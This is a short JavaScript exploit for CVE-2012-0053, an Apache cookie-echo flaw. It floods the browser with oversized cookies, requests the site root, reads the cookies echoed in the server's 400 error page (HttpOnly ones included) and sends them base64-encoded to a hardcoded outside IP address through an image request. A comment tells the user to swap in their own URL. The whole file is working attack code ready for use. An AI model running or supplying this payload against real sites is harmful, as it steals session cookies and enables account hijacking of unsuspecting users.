// Exploit for CVE-2012-0053

// Set megacookie
for( var j=0; j<100; j++ ){
  var c = "x"+j+"=";
  for( var i=0; i<500; i++ ){
    c+='A';
  }
  document.cookie = c;
}

x=new XMLHttpRequest(); 
x.onreadystatechange = function(){
  if( x.readyState == 4 ){
    var data = '';
    
    // 400 == exploit worked
    if( x.status == 400 ){
      aC = x.responseText.match(/<pre>([\s\S]*)<\/pre>/gm)[0].split(';');
      for( var i=0; i<aC.length; i++ ){
        if( !aC[i].trim().match(/x\d+=/) ){
          data += aC[i].trim() + '; ';
        }
      }

    // Anything else, not useful
    }else{
      data = "Exploit failed";
    }

    // Remove megacookie
    for( var j=0; j<100; j++ ){
      document.cookie = "x"+j+"=; expires=Thu, 01 Jan 1970 00:00:00 UTC";
    }

    // Send back
    // CHANGE THIS URL TO YOUR OWN
    new Image().src = 'http://193.36.15.252/cookie?=' + btoa(data);
  }
}
x.open('GET', '/' , true ); 
x.send(null); 

